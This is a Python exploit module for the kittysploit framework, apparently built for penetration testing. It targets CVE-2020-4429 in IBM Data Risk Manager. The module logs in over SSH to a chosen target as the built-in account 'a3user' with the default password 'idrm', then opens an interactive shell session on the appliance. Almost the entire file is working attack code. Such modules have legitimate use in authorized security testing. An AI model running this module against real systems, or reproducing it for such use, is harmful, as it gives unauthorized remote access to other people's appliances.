from kittysploit import *
from lib.ssh.ssh_client import Ssh_client

class Module(Exploit, Ssh_client):


	__info__ = {
			'name': 'IBM Data Risk Manager a3user Default Password',
			'description': "The 'a3user' has the default password 'idrm' and allows an attacker to log in to the virtual appliance via SSH",
			'cve': '2020-4429',
			'payload': {
				'default':'nopayload',
				}			
		}

	ssh_target = OptString("", "Target IPv4", "yes")
	ssh_port = OptPort(22, "Target SSH port", "yes")

	def run(self):
		client = self.open_ssh(user="a3user", password="idrm")
		connection = client.login()
		if connection:
			self.handler_ssh(connection)
		else:
			self.not_vulnerable()
